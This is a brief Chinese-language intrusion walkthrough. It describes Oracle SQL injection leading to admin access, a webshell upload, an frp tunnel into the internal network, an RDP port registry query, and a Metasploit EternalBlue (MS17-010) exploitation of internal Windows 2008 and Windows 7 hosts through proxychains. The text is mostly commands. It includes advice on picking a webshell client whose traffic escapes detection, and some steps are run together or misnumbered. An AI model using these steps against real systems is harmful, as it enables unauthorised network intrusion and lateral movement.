一、通过上传直接拿到webshell

前台通过oracle注入进入拿到后台管理员密码，然后进入后台直接上传拿到webshell。通过天蝎上传frp，成功搭建内网隧道。

0x01 连接天蝎

使用天蝎进行连接，有时候冰蝎的流量会被识别，因此天蝎也是一个不错的选择。

0x02 查看3389端口

REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber set /a Port=0x8f1

0x03 使用工具进行扫描

发现5台主机存在ms17_010漏洞。

0x04 配置proxychains

vi /etc/proxychains.conf

0x05 使用proxychains代理msf进行利用

proxychains4 msfconsole

三、使用永恒之蓝进行利用

0x01 使用MSF获取win2008shell

(1):寻找payload

search ms17-010use 2options

(2):设置目标主机

set rhost 192.168.0.104

(3):进行攻击

run

0x02 使用MSF获取win7shell

(1):设置目标IP

set rhost 192.168.10.38

(2):进行攻击

run
